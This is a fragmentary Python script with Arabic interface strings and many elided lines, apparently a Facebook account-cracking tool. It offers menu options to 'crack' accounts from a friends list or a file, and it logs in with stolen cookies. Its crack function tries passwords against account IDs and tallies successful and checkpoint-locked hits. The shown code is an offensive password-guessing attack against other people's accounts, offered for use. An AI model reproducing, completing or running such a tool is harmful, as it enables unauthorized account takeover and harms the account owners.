...
if an > an2 or an == an2:
 ...
 time.sleep(1)
 print('\t\n\033[1;31m  تــم ايــقــاف الادة')
 print('\033[1;31m @AL_OS1 الـــمـــطـــوࢪ  ')
 exit(0)
else: 
...
\033[2;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
	...
	print(B+'╰─ 1. Crack Publik ➪ من الاصدقاء ')	
	print(G+'╰─ 2. Crack File ➪ من ملف ')	
	print(('\033[92m—'*25)+'\n DeCoDe By @CP_OK2\n'+('—'*25))
	print(B+'╰─ 0. login out ➪ تغيير الكوكيز     ')
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s{ [martin ] %s/%s ➙ [صحيح] %s ➙ [سكيور] %s .. } %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'''مMr -Als<>اسف حساب سكيور ❌
